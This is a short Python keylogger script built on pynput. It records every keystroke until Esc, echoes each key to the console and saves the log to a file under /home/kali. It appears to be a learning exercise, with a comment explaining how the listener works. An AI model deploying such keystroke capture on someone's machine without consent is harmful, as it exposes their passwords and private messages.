from pynput import keyboard

loggingWord = ""
def on_press(key):
    global loggingWord
    try:
        print('alphanumeric key {0} pressed'.format(
            key.char))
        loggingWord = loggingWord + key.char
    except AttributeError:
        print('special key {0} pressed'.format(
            key))
        loggingWord = loggingWord + " " + str(key) + " "
def on_release(key):
    print('{0} released'.format(
        key))
    if key == keyboard.Key.esc:
        return False

with keyboard.Listener(
        on_press=on_press,
        on_release=on_release) as listener:
    listener.join()

file_name = "/home/kali/log.txt"

with open(file_name, 'w') as file:
    file.write(loggingWord)

'''
keyboard.listener is a class from the pynput module
this module is used to handle inputs from keyboard or mouse
with -> used as same working as try except, and ensures while inner things are closed before stopping
here we created an instance listener for keyboard.listenere which listens for on_press and on_release

this instance will listen to this event from starting to termination of the program, due to the 
listener.join()
'''
